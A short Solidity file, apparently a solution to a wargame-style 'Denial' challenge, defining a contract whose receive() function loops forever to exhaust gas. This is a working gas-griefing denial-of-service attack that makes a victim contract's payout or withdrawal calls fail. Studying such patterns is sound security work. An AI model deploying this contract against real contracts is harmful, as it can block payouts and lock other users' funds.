// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialHack {
    receive() external payable {
        // Just use up all the gas to cause a OOG error
        while (true) {}
    }
}
